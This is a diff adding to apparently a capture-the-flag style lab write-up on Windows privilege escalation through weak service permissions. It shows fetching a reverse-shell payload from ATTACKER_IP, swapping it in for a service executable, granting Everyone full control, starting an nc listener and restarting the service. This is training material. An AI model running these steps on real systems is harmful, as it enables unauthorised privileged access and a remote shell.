@@ -227,6 +227,33 @@ wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 - Once the payload is in the Windows server, we proceed to replace the service executable with our payload. 
 #### Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
 
+```cmd
+C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+```cmd
+nc -lvp 4445
+````
+
+#### We start a reverse listener on our attacker machine:
+- And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. 
+
+#### Use the following commands from a cmd.exe command prompt:
+```cmd
+C:\> sc stop windowsscheduler
+C:\> sc start windowsscheduler
+```
+- `Note`: PowerShell has sc as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
+
+
 
 
 ---
